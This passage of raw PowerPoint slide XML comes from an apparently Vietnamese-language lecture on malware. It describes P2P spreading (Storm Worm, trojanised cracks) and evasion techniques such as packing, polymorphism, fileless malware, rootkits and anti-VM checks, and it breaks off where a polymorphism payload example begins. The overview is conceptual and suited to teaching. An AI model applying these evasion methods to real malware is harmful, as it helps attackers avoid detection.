                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>truyền rất nhanh.</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42191731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8" y="993353"/>
            <a:ext cx="9696734" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kỹ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thuật phát tán Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kỹ</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thuật</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phát</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tán</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Mạng</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ngang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hang (P2P):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>dụ thực tế:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Storm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Worm (2007): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hát </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>tán qua email và mạng P2P, lây nhiễm hàng triệu máy tính, tạo botnet khổng lồ.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Các crack/keygen torrent ngày nay vẫn thường chứa trojan, spyware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>P2P </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>là môi trường lý tưởng cho malware phát tán, vì file được chia sẻ rộng, khó kiểm soát tính hợp pháp, và người dùng thường bỏ qua cảnh báo bảo mật.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1"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1346102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993353"/>
            <a:ext cx="10583839"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Obfuscation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>M</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>ã </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hóa hoặc đổi tên biến/hàm để tránh phân tích.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Packing/Encryption: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>én </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hoặc mã hóa file thực thi, chỉ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>g</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mã </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>khi chạy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Polymorphism</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Đa</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hình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="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M</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>alware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>tự thay đổi cấu trúc khi lây lan để tránh bị nhận diện.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Metamorphism</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Biến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thể</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="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hay </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>đổi mã nguồn hoàn toàn nhưng giữ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>nguyên</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c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hức</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năng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Fileless Malware: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>H</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>oạt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>động trực tiếp trong bộ nhớ (RAM), không để lại file trên ổ đĩa.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Rootkit: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ẩ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>n </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>tiến trình, file, hoặc kết nối để tránh bị phát hiện.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Anti-sandbox/Anti-VM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="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iểm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>tra môi trường ảo hóa và thay đổi hành vi để né phân tích.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Living-off-the-land (LoTL): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>L</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>ợi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>dụng công cụ hợp pháp sẵn có trong hệ thống (PowerShell, WMI, CMD…).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22789092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993353"/>
            <a:ext cx="10174407"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Polymorphism</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="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Malware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>giữ nguyên chức năng cốt lõi, nhưng mỗi lần lây lan nó sẽ thay đổi lớp mã hóa/giải mã bên ngoài, khiến signature-based antivirus khó phát hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví</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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Polymorphism</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1. Payload gốc (ẩn bên trong):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>// Payload chính: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>n </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
